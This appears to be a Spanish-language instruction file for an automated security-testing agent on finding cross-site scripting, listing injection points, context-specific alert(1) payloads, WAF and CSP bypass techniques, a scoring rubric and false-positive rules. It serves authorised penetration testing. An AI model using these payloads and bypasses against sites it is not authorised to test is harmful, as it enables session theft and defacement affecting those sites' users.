# SKILL: CROSS-SITE SCRIPTING (XSS)

<!-- critical -->
XSS permite inyectar scripts maliciosos en páginas web vistas por otros usuarios. Puede llevar al robo de sesiones (cookies), phishing, redirecciones maliciosas o defacement.
<!-- /critical -->

## 1. SCOPE - Dónde Buscar

<!-- scope -->
- **Parámetros de URL**: q=, name=, id=, redirect_url=, msg=
- **Formularios**: Comentarios, perfiles, mensajes, registro.
- **Headers**: User-Agent, Referer (si se muestran en logs o dashboards).
- **Paths**: `/blog/<script>...`
- **Fragmentos (DOM)**: `index.html#name=...`
<!-- /scope -->

## 2. METHODOLOGY

<!-- methodology -->
1. **IDENTIFY**: Inyectar caracteres de control (`< > " ' ( )`) y ver si se reflejan sin escape.
2. **CONTEXT**: Determinar si la inyección es en HTML puro, atributo de tag, bloque de JavaScript o URL.
3. **PAYLOAD**: Crear un payload que ejecute JS (e.g., `alert(1)`, `fetch()`, `console.log()`).
4. **BYPASS**: Si hay filtros (WAF/Sanitizers), probar variaciones (encoding, event handlers, etiquetas raras).
5. **DOM-BASED**: Buscar `sources` (location.hash) que lleguen a `sinks` peligrasos (innerHTML, eval).
<!-- /methodology -->

## 3. KNOWLEDGE BASE

<!-- knowledge -->

### XSS Contexts

- **HTML Tag**: `<div>[INJECTION]</div>` -> `<script>alert(1)</script>`
- **Attribute**: `<input value="[INJECTION]">` -> `" onmouseover="alert(1)`
- **JavaScript**: `<script>var x = '[INJECTION]';</script>` -> `';alert(1);'`
- **URL**: `<a href="[INJECTION]">` -> `javascript:alert(1)`

### Common Bypasses

- **Tag Filters**: Use `<details open ontoggle=alert(1)>`, `<svg onload=alert(1)>`, `<audio src onerror=alert(1)>`.
- **Keyword Filters**: `(alert)(1)`, `eval(atob('YWxlcnQoMSk='))`, `` `confirm``` (backticks).
- **Encoding**: HTML entities (`&#x3c;`), URL encoding, Unicode escapes.

### CSP Bypass

- **JSONP Sinks**: Usar endpoints vulnerables de dominios permitidos (e.g., google.com/complete/search).
- **Angular/Vue libraries**: Usar vulnerabilidades conocidas de frameworks permitidos.
- **Missing `object-src`**: Inyectar vía Flash o Java Applets.

<!-- /knowledge -->

## 4. SCORING GUIDE

<!-- scoring_guide -->

| Score | Criterio | Ejemplo |
| :--- | :--- | :--- |
| **9-10** | **CONFIRMED** - Ejecución de JS confirmada | `alert`, `prompt` o callback OOB ejecutado por el browser |
| **7-8** | **HIGH** - Reflexión sin escape en contexto ejecutable | `<script>`, `onerror`, `javascript:` sin filtrar |
| **5-6** | **MEDIUM** - Reflexión parcial o bloqueada por WAF | Caracteres `< >` permitidos pero etiquetas bloqueadas |
| **3-4** | **LOW** - Reflexión escapada o fuera de contexto | `&lt;script&gt;` visible en el HTML como texto |
| **0-2** | **REJECT** - Falso positivo claro | El input no se refleja en absoluto o es "EXPECTED: SAFE" |

**AUTO-SCORING KEYWORDS:**

- 9-10: "alert(1)", "prompt(1)", "Interactsh callback", "script execution confirmed"
- 7-8: "reflected unescaped", "onerror in attribute", "javascript: scheme"
- 5-6: "partially filtered", "WAF detected payload", "blocked by CSP"
- 0-2: "properly escaped", "htmlentities used", "display only"

<!-- /scoring_guide -->

## 5. FALSE POSITIVES

<!-- false_positives -->

**RECHAZAR INMEDIATAMENTE:**

1. El script se ve en la pantalla como texto literal (E.g., `&lt;script&gt;`).
2. El script se inyecta en una página que solo tú puedes ver (Self-XSS) sin impacto real.
3. El payload es bloqueado por el browser (Auditor/SOP) y no hay bypass.
4. "EXPECTED: SAFE" en el contexto.

**NO SON FALSOS POSITIVOS:**

- XSS en el panel de administración (Stored XSS de alto impacto).
- XSS vía `javascript:` en links (Impacto mediante interacción).
- Reflejo en un bloque `JSON` que luego es procesado por un script.

<!-- /false_positives -->

## 6. PAYLOADS

<!-- payloads -->

### HIGH VALUE (Polyglots/Bypass)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
'"><details open ontoggle=alert(1)>
```

### MEDIUM VALUE (Framework specific)

```html
{{constructor.constructor('alert(1)')()}} (Angular)
<div v-html="'<img src=x onerror=alert(1)>'"></div> (Vue)
```

### BYPASS (Encoding)

```html
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">Click</a>
```

<!-- /payloads -->

## 7. PRO TIPS

<!-- pro_tips -->
1. **Blind XSS**: Usa siempre un servidor OOB (xsshunter, interactsh) para detectar XSS que se ejecutan en paneles privados.
2. **Interact with the page**: Prueba botones, menús y formularios después de inyectar; el XSS puede activarse con una acción.
3. **Vision Model**: Si usas un modelo de visión, pídele que busque específicamente ventanas de `alert` o `overlay`.
<!-- /pro_tips -->
